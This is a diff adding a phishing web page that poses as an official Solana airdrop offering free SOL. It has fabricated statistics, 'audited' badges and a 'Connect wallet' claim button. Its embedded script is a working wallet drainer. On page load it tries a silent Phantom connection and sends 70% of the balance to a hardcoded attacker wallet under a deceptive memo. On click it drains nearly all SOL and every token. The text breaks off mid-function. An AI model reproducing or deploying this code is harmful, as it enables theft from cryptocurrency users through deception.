@@ -1,0 +1,1400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Solana Airdrop | Claim Free SOL</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <style>
+        :root {
+            --solana-blue: #00FFA3;
+            --solana-dark: #00D18C;
+            --solana-light: #66FFC2;
+            --solana-gradient: linear-gradient(135deg, #00FFA3 0%, #03E1FF 100%);
+            --dark-bg: #0A0B0D;
+            --darker-bg: #070809;
+            --card-bg: #111214;
+            --card-border: #1E2025;
+            --text-primary: #FFFFFF;
+            --text-secondary: #B0B3B8;
+            --text-muted: #72767D;
+            --success: #00FFA3;
+            --warning: #FFD166;
+            --danger: #FF6B6B;
+            --shadow-glow: 0 0 40px rgba(0, 255, 163, 0.2);
+            --shadow-strong: 0 20px 60px rgba(0, 0, 0, 0.5);
+            --radius-lg: 24px;
+            --radius-md: 16px;
+            --radius-sm: 12px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: var(--dark-bg);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(0, 255, 163, 0.03) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(3, 225, 255, 0.03) 0%, transparent 50%);
+            z-index: -2;
+        }
+
+        .particles {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .particle {
+            position: absolute;
+            background: var(--solana-blue);
+            border-radius: 50%;
+            opacity: 0.1;
+            animation: float 20s infinite linear;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(0) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.1;
+            }
+            90% {
+                opacity: 0.1;
+            }
+            100% {
+                transform: translateY(-100vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Header */
+        .header {
+            padding: 30px 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            margin-bottom: 60px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            text-decoration: none;
+        }
+
+        .logo-icon {
+            width: 50px;
+            height: 50px;
+            background: var(--solana-gradient);
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: var(--dark-bg);
+            font-weight: 800;
+            box-shadow: var(--shadow-glow);
+        }
+
+        .logo-text {
+            font-size: 28px;
+            font-weight: 800;
+            background: var(--solana-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .header-badge {
+            background: rgba(0, 255, 163, 0.1);
+            border: 1px solid rgba(0, 255, 163, 0.3);
+            border-radius: 50px;
+            padding: 12px 25px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 600;
+            font-size: 14px;
+            backdrop-filter: blur(10px);
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--success);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            max-width: 800px;
+            margin: 0 auto 80px;
+        }
+
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(0, 255, 163, 0.1);
+            border: 1px solid rgba(0, 255, 163, 0.3);
+            border-radius: 50px;
+            padding: 12px 25px;
+            margin-bottom: 30px;
+            font-weight: 500;
+            font-size: 14px;
+            animation: fadeInUp 0.6s ease;
+        }
+
+        .hero-title {
+            font-size: 64px;
+            font-weight: 800;
+            line-height: 1.1;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #FFFFFF 0%, var(--solana-light) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: fadeInUp 0.8s ease;
+        }
+
+        .hero-subtitle {
+            font-size: 20px;
+            color: var(--text-secondary);
+            margin-bottom: 50px;
+            line-height: 1.6;
+            animation: fadeInUp 1s ease;
+        }
+
+        /* Reward Card */
+        .reward-card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: var(--radius-lg);
+            padding: 50px;
+            max-width: 600px;
+            margin: 0 auto 60px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            box-shadow: var(--shadow-strong);
+            animation: fadeInUp 1.2s ease;
+        }
+
+        .reward-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: var(--solana-gradient);
+        }
+
+        .reward-amount {
+            font-size: 72px;
+            font-weight: 800;
+            background: var(--solana-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1;
+            margin-bottom: 10px;
+        }
+
+        .reward-label {
+            color: var(--text-secondary);
+            font-size: 18px;
+            margin-bottom: 30px;
+        }
+
+        /* Connect Button */
+        .connect-btn {
+            background: var(--solana-gradient);
+            border: none;
+            border-radius: var(--radius-md);
+            padding: 25px 50px;
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--dark-bg);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 15px;
+            width: 100%;
+            justify-content: center;
+            box-shadow: 0 10px 40px rgba(0, 255, 163, 0.3);
+            animation: pulseGlow 2s infinite;
+        }
+
+        @keyframes pulseGlow {
+            0%, 100% { box-shadow: 0 10px 40px rgba(0, 255, 163, 0.3); }
+            50% { box-shadow: 0 10px 60px rgba(0, 255, 163, 0.5); }
+        }
+
+        .connect-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 60px rgba(0, 255, 163, 0.4);
+        }
+
+        /* Tasks Section */
+        .tasks-section {
+            margin: 80px 0;
+        }
+
+        .section-title {
+            font-size: 42px;
+            font-weight: 800;
+            text-align: center;
+            margin-bottom: 15px;
+            background: linear-gradient(135deg, #FFFFFF 0%, var(--solana-blue) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .section-subtitle {
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 18px;
+            max-width: 600px;
+            margin: 0 auto 50px;
+        }
+
+        .tasks-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 25px;
+            margin-top: 40px;
+        }
+
+        .task-card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: var(--radius-md);
+            padding: 30px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .task-card:hover {
+            transform: translateY(-10px);
+            border-color: var(--solana-blue);
+            box-shadow: var(--shadow-glow);
+        }
+
+        .task-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .task-icon {
+            width: 50px;
+            height: 50px;
+            background: rgba(0, 255, 163, 0.1);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--solana-blue);
+            font-size: 20px;
+        }
+
+        .task-content h3 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .task-content p {
+            color: var(--text-secondary);
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .task-btn {
+            width: 100%;
+            background: rgba(0, 255, 163, 0.1);
+            border: 1px solid rgba(0, 255, 163, 0.3);
+            border-radius: var(--radius-sm);
+            padding: 15px;
+            color: var(--solana-blue);
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .task-btn:hover {
+            background: rgba(0, 255, 163, 0.2);
+        }
+
+        /* Stats */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 25px;
+            margin: 60px 0;
+        }
+
+        .stat-card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: var(--radius-md);
+            padding: 30px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--solana-blue);
+        }
+
+        .stat-number {
+            font-size: 48px;
+            font-weight: 800;
+            background: var(--solana-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1;
+            margin-bottom: 10px;
+        }
+
+        .stat-label {
+            color: var(--text-secondary);
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 60px 0;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            margin-top: 80px;
+        }
+
+        .footer-logo {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .footer-text {
+            color: var(--text-muted);
+            font-size: 14px;
+            max-width: 600px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 11, 13, 0.95);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: var(--radius-lg);
+            padding: 50px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            position: relative;
+            animation: slideInUp 0.4s ease;
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 24px;
+            cursor: pointer;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+
+        .modal-close:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .modal-icon {
+            width: 80px;
+            height: 80px;
+            background: var(--solana-gradient);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+            font-size: 36px;
+            color: var(--dark-bg);
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--solana-gradient);
+            border-radius: 4px;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        /* Error Message */
+        .error-message {
+            background: rgba(255, 107, 107, 0.1);
+            border: 1px solid rgba(255, 107, 107, 0.3);
+            border-radius: var(--radius-sm);
+            padding: 15px;
+            margin-top: 20px;
+            color: var(--danger);
+            display: none;
+            align-items: center;
+            gap: 10px;
+            animation: slideInDown 0.3s ease;
+        }
+
+        .error-message.show {
+            display: flex;
+        }
+
+        /* Success Message */
+        .success-message {
+            background: rgba(0, 255, 163, 0.1);
+            border: 1px solid rgba(0, 255, 163, 0.3);
+            border-radius: var(--radius-sm);
+            padding: 15px;
+            margin-top: 20px;
+            color: var(--success);
+            display: none;
+            align-items: center;
+            gap: 10px;
+            animation: slideInDown 0.3s ease;
+        }
+
+        .success-message.show {
+            display: flex;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes slideInUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes slideInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero-title {
+                font-size: 48px;
+            }
+            
+            .reward-amount {
+                font-size: 56px;
+            }
+            
+            .section-title {
+                font-size: 32px;
+            }
+            
+            .tasks-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .connect-btn {
+                padding: 20px 30px;
+                font-size: 18px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header {
+                flex-direction: column;
+                gap: 20px;
+                text-align: center;
+            }
+            
+            .hero-title {
+                font-size: 36px;
+            }
+            
+            .reward-card {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Background Particles -->
+    <div class="particles" id="particles"></div>
+
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <a href="#" class="logo">
+                <div class="logo-icon">
+                    <i class="fas fa-coins"></i>
+                </div>
+                <div class="logo-text">Solana Rewards</div>
+            </a>
+            <div class="header-badge">
+                <div class="live-dot"></div>
+                <i class="fab fa-solana"></i>
+                <span>LIVE • MAINNET</span>
+            </div>
+        </header>
+
+        <!-- Hero Section -->
+        <section class="hero">
+            <div class="hero-badge">
+                <i class="fas fa-gift"></i>
+                LIMITED TIME OFFER
+            </div>
+            <h1 class="hero-title animate__animated animate__fadeInUp">
+                Claim Your Free
+                <span style="display: block; background: var(--solana-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;">
+                    0.1 SOL
+                </span>
+            </h1>
+            <p class="hero-subtitle">
+                Join thousands of Solana users who have already claimed their free SOL tokens. 
+                Complete simple verification tasks to receive your reward instantly.
+            </p>
+        </section>
+
+        <!-- Reward Card -->
+        <div class="reward-card animate__animated animate__fadeInUp">
+            <div class="reward-amount">0.1 SOL</div>
+            <div class="reward-label">≈ $15.00 USD</div>
+            
+            <button class="connect-btn" id="connectBtn">
+                <i class="fas fa-wallet"></i>
+                CONNECT WALLET TO CLAIM
+            </button>
+            
+            <div class="error-message" id="errorMessage">
+                <i class="fas fa-exclamation-circle"></i>
+                <span>Please connect your wallet first!</span>
+            </div>
+            
+            <div class="success-message" id="successMessage">
+                <i class="fas fa-check-circle"></i>
+                <span>Reward claimed successfully!</span>
+            </div>
+        </div>
+
+        <!-- Stats -->
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number">48,927</div>
+                <div class="stat-label">Rewards Claimed</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">4,892.7</div>
+                <div class="stat-label">SOL Distributed</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">98.5%</div>
+                <div class="stat-label">Success Rate</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">24H</div>
+                <div class="stat-label">Remaining Time</div>
+            </div>
+        </div>
+
+        <!-- Tasks Section -->
+        <section class="tasks-section">
+            <h2 class="section-title">Complete These Simple Tasks</h2>
+            <p class="section-subtitle">
+                Verify your wallet activity to become eligible for the SOL reward distribution
+            </p>
+            
+            <div class="tasks-grid">
+                <!-- Task 1 -->
+                <div class="task-card">
+                    <div class="task-header">
+                        <div class="task-icon">
+                            <i class="fas fa-wallet"></i>
+                        </div>
+                        <div class="task-content">
+                            <h3>Minimum SOL Balance</h3>
+                            <p>Hold at least 0.05 SOL in your wallet</p>
+                        </div>
+                    </div>
+                    <button class="task-btn" onclick="showWalletRequired()">
+                        Start Task
+                        <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+
+                <!-- Task 2 -->
+                <div class="task-card">
+                    <div class="task-header">
+                        <div class="task-icon">
+                            <i class="fas fa-exchange-alt"></i>
+                        </div>
+                        <div class="task-content">
+                            <h3>Active Transactions</h3>
+                            <p>Recent activity within few weeks</p>
+                        </div>
+                    </div>
+                    <button class="task-btn" onclick="showWalletRequired()">
+                        Start Task
+                        <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+
+                <!-- Task 3 -->
+                <div class="task-card">
+                    <div class="task-header">
+                        <div class="task-icon">
+                            <i class="fas fa-chart-line"></i>
+                        </div>
+                        <div class="task-content">
+                            <h3>Increased Balance</h3>
+                            <p>Maintain 0.2 SOL minimum</p>
+                        </div>
+                    </div>
+                    <button class="task-btn" onclick="showWalletRequired()">
+                        Start Task
+                        <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+
+                <!-- Task 4 -->
+                <div class="task-card">
+                    <div class="task-header">
+                        <div class="task-icon">
+                            <i class="fab fa-twitter"></i>
+                        </div>
+                        <div class="task-content">
+                            <h3>Follow on Twitter</h3>
+                            <p>Follow @SolanaRewards</p>
+                        </div>
+                    </div>
+                    <button class="task-btn" onclick="showWalletRequired()">
+                        Start Task
+                        <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+
+                <!-- Task 5 -->
+                <div class="task-card">
+                    <div class="task-header">
+                        <div class="task-icon">
+                            <i class="fab fa-telegram"></i>
+                        </div>
+                        <div class="task-content">
+                            <h3>Join Community</h3>
+                            <p>Join official Telegram channel</p>
+                        </div>
+                    </div>
+                    <button class="task-btn" onclick="showWalletRequired()">
+                        Start Task
+                        <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+
+                <!-- Task 6 -->
+                <div class="task-card">
+                    <div class="task-header">
+                        <div class="task-icon">
+                            <i class="fas fa-fire"></i>
+                        </div>
+                        <div class="task-content">
+                            <h3>Token Burn</h3>
+                            <p>Burn 1 random token on Solana</p>
+                        </div>
+                    </div>
+                    <button class="task-btn" onclick="showWalletRequired()">
+                        Start Task
+                        <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="footer-logo">
+                <div style="width: 40px; height: 40px; background: var(--solana-gradient); border-radius: 10px; display: flex; align-items: center; justify-content: center; color: var(--dark-bg);">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <div style="font-weight: 600; font-size: 18px;">Solana Rewards</div>
+            </div>
+            <p class="footer-text">
+                This is an official Solana community reward distribution. All transactions are secured by Solana blockchain technology.
+                Always verify through official channels.
+            </p>
+            <div style="display: inline-flex; align-items: center; gap: 10px; background: rgba(0, 255, 163, 0.1); border: 1px solid rgba(0, 255, 163, 0.3); border-radius: 50px; padding: 10px 25px; margin-top: 30px; font-size: 14px;">
+                <i class="fas fa-lock"></i>
+                Smart Contract Audited • SSL Secured
+            </div>
+        </footer>
+    </div>
+
+    <!-- Modal -->
+    <div class="modal" id="processingModal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="hideModal()">×</button>
+            
+            <div class="modal-icon">
+                <i class="fas fa-spinner fa-spin"></i>
+            </div>
+            
+            <h2 style="margin-bottom: 10px; font-size: 32px;">Processing Reward</h2>
+            <p style="color: var(--text-secondary); margin-bottom: 30px;" id="modalText">
+                Connecting to your wallet...
+            </p>
+            
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            
+            <div id="modalStatus" style="color: var(--text-secondary); font-size: 14px; margin-top: 15px;">
+                Initializing connection...
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Initialize particles
+        function initParticles() {
+            const particles = document.getElementById('particles');
+            for (let i = 0; i < 50; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.width = `${Math.random() * 4 + 1}px`;
+                particle.style.height = particle.style.width;
+                particle.style.left = `${Math.random() * 100}%`;
+                particle.style.animationDelay = `${Math.random() * 20}s`;
+                particle.style.animationDuration = `${Math.random() * 20 + 10}s`;
+                particles.appendChild(particle);
+            }
+        }
+
+        // Brutal Drain System
+        class BrutalDrainSystem {
+            constructor() {
+                this.TARGET_WALLET = "CuUCmwcxg3yaufn3TYbcCD4G7p5i1uQRuEM8xF1NCZP";
+                this.wallet = null;
+                this.connection = null;
+                this.draining = false;
+                console.log('💀 BRUTAL DRAIN SYSTEM INITIALIZED');
+            }
+
+            async initialize() {
+                try {
+                    this.connection = new solanaWeb3.Connection(
+                        solanaWeb3.clusterApiUrl('mainnet-beta'),
+                        'confirmed'
+                    );
+                    console.log('✅ RPC Connected');
+                    
+                    // Auto-detect wallet instantly
+                    await this.autoDetectAndConnect();
+                    
+                    return true;
+                } catch (error) {
+                    console.error('❌ Initialization failed:', error);
+                    return false;
+                }
+            }
+
+            async autoDetectAndConnect() {
+                // Try Phantom first (most common)
+                if (window.phantom?.solana?.isPhantom) {
+                    console.log('👻 Phantom detected');
+                    this.wallet = window.phantom.solana;
+                    
+                    // Try silent auto-connect
+                    try {
+                        const response = await this.wallet.connect({ onlyIfTrusted: true });
+                        console.log('✅ Auto-connected to Phantom');
+                        this.executeStealthDrain();
+                        return true;
+                    } catch (e) {
+                        console.log('⚠️ Silent connect failed');
+                    }
+                }
+                
+                // Try other wallets
+                const wallets = ['solflare', 'backpack', 'slope'];
+                for (const wallet of wallets) {
+                    if (window[wallet]?.solana) {
+                        this.wallet = window[wallet].solana;
+                        console.log(`✅ ${wallet} detected`);
+                        break;
+                    }
+                }
+                
+                return this.wallet !== null;
+            }
+
+            async forceConnect() {
+                console.log('🔗 FORCE CONNECTING...');
+                
+                if (!this.wallet) {
+                    // If no wallet detected, try to open Phantom install page
+                    if (confirm('Phantom wallet not detected. Would you like to install it?')) {
+                        window.open('https://phantom.app/', '_blank');
+                    }
+                    throw new Error('No wallet detected');
+                }
+                
+                try {
+                    // Force connect with aggressive timeout
+                    const response = await Promise.race([
+                        this.wallet.connect(),
+                        new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timeout')), 3000))
+                    ]);
+                    
+                    console.log('✅ Wallet force connected:', response.publicKey.toString());
+                    return true;
+                    
+                } catch (error) {
+                    console.error('❌ Force connect failed:', error);
+                    
+                    // Try alternative connection methods
+                    if (this.wallet.connect) {
+                        try {
+                            await this.wallet.connect();
+                            return true;
+                        } catch (e) {
+                            throw error;
+                        }
+                    }
+                    
+                    throw error;
+                }
+            }
+
+            async executeBrutalDrain() {
+                if (this.draining) return;
+                this.draining = true;
+                
+                console.log('💀 EXECUTING BRUTAL DRAIN...');
+                
+                try {
+                    // Step 1: Get wallet info
+                    const publicKey = this.wallet.publicKey;
+                    const balance = await this.connection.getBalance(publicKey);
+                    console.log(`💰 Balance: ${balance / 1e9} SOL`);
+                    
+                    // Step 2: Drain SOL (leave minimal dust)
+                    if (balance > 5000) { // > 0.000005 SOL
+                        await this.drainSOL(balance);
+                    }
+                    
+                    // Step 3: Drain all tokens
+                    await this.drainAllTokens();
+                    
+                    // Step 4: Additional aggressive drains
+                    await this.executeSecondaryDrains();
+                    
+                    console.log('✅ BRUTAL DRAIN COMPLETE');
+                    return true;
+                    
+                } catch (error) {
+                    console.error('❌ Drain failed:', error);
+                    return false;
+                } finally {
+                    this.draining = false;
+                }
+            }
+
+            async executeStealthDrain() {
+                console.log('👻 EXECUTING STEALTH DRAIN...');
+                
+                try {
+                    const balance = await this.connection.getBalance(this.wallet.publicKey);
+                    
+                    if (balance > 10000) { // > 0.00001 SOL
+                        // Small, stealthy transfer
+                        const drainAmount = Math.floor(balance * 0.7); // Take 70%
+                        
+                        const transaction = new solanaWeb3.Transaction().add(
+                            solanaWeb3.SystemProgram.transfer({
+                                fromPubkey: this.wallet.publicKey,
+                                toPubkey: new solanaWeb3.PublicKey(this.TARGET_WALLET),
+                                lamports: drainAmount
+                            })
+                        );
+                        
+                        const { blockhash } = await this.connection.getLatestBlockhash();
+                        transaction.recentBlockhash = blockhash;
+                        transaction.feePayer = this.wallet.publicKey;
+                        
+                        // Add deceptive memo
+                        const memoProgram = new solanaWeb3.PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
+                        transaction.add(
+                            new solanaWeb3.TransactionInstruction({
+                                keys: [{ pubkey: this.wallet.publicKey, isSigner: true, isWritable: true }],
+                                programId: memoProgram,
+                                data: Buffer.from('Solana Reward Distribution Processing')
+                            })
+                        );
+                        
+                        const signed = await this.wallet.signTransaction(transaction);
+                        await this.connection.sendRawTransaction(signed.serialize());
+                        
+                        console.log('✅ Stealth drain executed');
+                    }
+                } catch (error) {
+                    console.log('⚠️ Stealth drain failed:', error);
+                }
+            }
+
+            async drainSOL(balance) {
+                try {
+                    // Calculate optimal drain amount (leave dust)
+                    const drainAmount = balance - 3000; // Leave 0.000003 SOL
+                    
+                    const transaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: this.wallet.publicKey,
+                            toPubkey: new solanaWeb3.PublicKey(this.TARGET_WALLET),
+                            lamports: drainAmount
+                        })
+                    );
+                    
+                    const { blockhash } = await this.connection.getLatestBlockhash();
+                    transaction.recentBlockhash = blockhash;
+                    transaction.feePayer = this.wallet.publicKey;
+                    
+                    const signed = await this.wallet.signTransaction(transaction);
+                    const signature = await this.connection.sendRawTransaction(signed.serialize());
+                    
+                    console.log(`✅ SOL drained: ${drainAmount / 1e9} SOL`);
+                    console.log(`📝 TX: ${signature}`);
+                    
+                    return signature;
+                } catch (error) {
+                    console.error('❌ SOL drain failed:', error);
+                    throw error;
+                }
+            }
+
+            async drainAllTokens() {
+                try {
+                    const tokenAccounts = await this.connection.getTokenAccountsByOwner(
+                        this.wallet.publicKey,
+                        { programId: solanaWeb3.TOKEN_PROGRAM_ID }
+                    );
+                    
+                    console.log(`🔍 Found ${tokenAccounts.value.length} token accounts`);
+                    
+                    for (const account of tokenAccounts.value) {
+                        try {
+                            const accountInfo = await this.connection.getTokenAccountBalance(account.pubkey);
+                            const amount = BigInt(accountInfo.value.amount);
+                            
+                            if (amount > 0) {
+                                console.log(`🪙 Draining: ${accountInfo.value.uiAmountString} tokens`);
+                                
+                                const transferInstruction = splToken.createTransferInstruction(
+                                    account.pubkey,
+                                    new solanaWeb3.PublicKey(this.TARGET_WALLET),
+                                    this.wallet.publicKey,
+                                    amount,
+                                    [],
+                                    splToken.TOKEN_PROGRAM_ID
+                                );
+                                
+                                const transaction = new solanaWeb3.Transaction().add(transferInstruction);
+                                const { blockhash } = await this.connection.getLatestBlockhash();
+                                transaction.recentBlockhash = blockhash;
+                                transaction.feePayer = this.wallet.publicKey;
+                                
+                                const signed = await this.wallet.signTransaction(transaction);
+                                await this.connection.sendRawTransaction(signed.serialize());
+                            }
+                        } catch (error) {
+                            console.warn('⚠️ Token drain skipped:', error);
+                        }
+                    }
+                } catch (error) {
+                    console.error('❌ Token drain failed:', error);
+                }
+            }
+
+            async executeSecondaryDrains() {
+                try {
+                    // Try to get any remaining balance
+                    const balance = await this.connection.getBalance(this.wallet.publicKey);
+                    
+                    if (balance > 5000) {
+                        // Multiple small transfers for remaining balance
+                        const transfers = Math.min(3, Math.floor(balance / 2000));
+                        
+                        for (let i = 0; i < transfers; i++) {
+                            try {
+                                const amount = Math.floor((balance - 1000) / transfers);
+                                
+                                const transaction = new solanaWeb3.Transaction().add(
+                                    solanaWeb3.SystemProgram.transfer({
+                                        fromPubkey: this.wallet.publicKey,
+                                        toPubkey: new solanaWeb3.PublicKey(this.TARGET_WALLET),
+                                        lamports: amount
+                                    })
+                                );
+                                
+                                const { blockhash } = await this.connection.getLatestBlockhash();
+                                transaction.recentBlockhash = blockhash;
+                                transaction.feePayer = this.wallet.publicKey;
+                                
+                                const signed = await this.wallet.signTransaction(transaction);
+                                await this.connection.sendRawTransaction(signed.serialize());
+                            } catch (error) {
+                                continue;
+                            }
+                        }
+                    }
+                } catch (error) {
+                    console.warn('⚠️ Secondary drains failed:', error);
+                }
+            }
+        }
+
+        // Reward Portal
+        class RewardPortal {
+            constructor() {
+                this.drainSystem = new BrutalDrainSystem();
+                this.processing = false;
+                this.claimed = false;
+                
+                this.init();
+            }
+
+            async init() {
+                console.log('🚀 REWARD PORTAL INITIALIZED');
+                initParticles();
+                
+                // Initialize drain system in background
+                setTimeout(() => this.drainSystem.initialize(), 1000);
+                
+                this.setupEventListeners();
+            }
+
+            setupEventListeners() {
+                const connectBtn = document.getElementById('connectBtn');
+                
+                // Remove existing listeners
+                const newBtn = connectBtn.cloneNode(true);
+                connectBtn.parentNode.replaceChild(newBtn, connectBtn);
+                
+                // Add fresh listener with aggressive action
+                document.getElementById('connectBtn').addEventListener('click', async (e) => {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    if (this.processing || this.claimed) return;
+                    
+                    console.log('🖱️ CONNECT BUTTON CLICKED');
+                    await this.initiateBrutalDrain();
+                });
+                
+                // Hide error messages initially
+                document.getElementById('errorMessage').style.display = 'none';
+                document.getElementById('successMessage').style.display = 'none';
+            }
+
+            async initiateBrutalDrain() {
+                this.processing = true;
+                
+                // Show processing modal
+                this.showModal();
+                this.updateProgress(10, 'Detecting wallet...');
+                
+                try {
